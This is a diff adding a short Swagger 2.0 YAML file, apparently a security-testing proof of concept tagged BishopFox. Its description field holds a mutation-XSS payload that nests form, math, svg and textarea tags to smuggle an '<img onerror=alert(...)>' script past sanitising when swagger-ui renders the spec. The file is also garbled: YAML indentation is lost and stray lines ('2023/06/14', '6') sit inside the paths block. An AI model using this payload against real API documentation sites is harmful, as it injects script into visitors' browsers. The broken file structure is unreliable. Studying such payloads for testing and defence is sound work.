@@ -1,0 +1,18 @@
+swagger: "2.0"
+info:
+title: BF swagger-ui XSS
+description: |
+<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path
+id="</textarea><img onerror=alert('XSS') src=1>"></form>
+paths:
+/BF:
+get:
+2023/06/14
+ 6
+responses:
+"200":
+description: No response was specified
+tags:
+- BishopFox
+operationId: xssTest
+summary: Test for XSS
